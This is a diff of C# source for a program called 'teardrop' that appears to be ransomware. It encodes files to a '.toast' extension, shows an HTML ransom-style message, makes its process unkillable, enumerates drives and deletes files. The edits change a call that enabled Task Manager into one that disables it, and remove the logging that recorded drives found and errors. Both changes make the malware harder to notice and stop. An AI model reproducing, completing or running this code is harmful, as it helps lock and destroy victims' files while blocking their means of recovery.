@@ -1,13 +1,10 @@
-using System.Reflection;
-using System.Runtime.Versioning;
-
 namespace teardrop
 {
     public partial class FrmMain : Form
     {
         private static string generatedKey = string.Empty;
         private const string defaultExtension = ".toast";
-        private const string defaultMessage = "<h1>Github:</h1><p>´something</p>";
+        private const string defaultMessage = "<h1>Title:</h1><p>Message</p>";
         private enum CypherMode
         {
             Encode,
@@ -45,20 +42,7 @@ namespace teardrop
             GenerateKeys();
             GenerateRandomApplicationName();
             ProcessManager.ProcessUnkillable();
-            MachineManager.EnableTaskManager();
-        }
-
-        public static void Log(string text, string title)
-        {
-            try
-            {
-                if (File.Exists(@".\log.txt"))
-                {
-                    string prefix = $"[{DateTime.Now}] ";
-                    File.AppendAllText(@".\log.txt", $"{prefix}{text}{Environment.NewLine}");
-                }
-            }
-            catch { }
+            MachineManager.DisableTaskManager();
         }
 
 
@@ -127,9 +111,9 @@ namespace teardrop
                     }
                 }
             }
-            catch (Exception e)
+            catch (Exception ex)
             {
-                WriteLine(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
+                WriteLine(ex.Message);
             }
         }
 
@@ -149,10 +133,9 @@ namespace teardrop
             {
                 File.Delete(filePath);
             }
-            catch (Exception ex2)
+            catch (Exception ex)
             {
-                WriteLine($"Cant delete file {ex2.Message}");
-                Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
+                WriteLine($"Cant delete file {ex.Message}");
             }
         }
 
@@ -167,7 +150,6 @@ namespace teardrop
         private void ChangeDrive(DriveInfo drive, CypherMode mode)
         {
             WriteLine($@"Found drive {drive.Name}");
-            Log($@"Found drive {drive.Name}", "GetFiles > Drive State Check");
 
             try
             {
@@ -180,9 +162,7 @@ namespace teardrop
             }
             catch (Exception ex)
             {
-                Log($@"Found drive {drive.Name} , but it's not ready.", "GetFiles > Drive State Check");
-                WriteLine($@"Found drive {drive.Name}, but it's not ready.");
-                Log($@"More information about the exception: {ex.Message}", "");
+                WriteLine($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
             }
         }
 
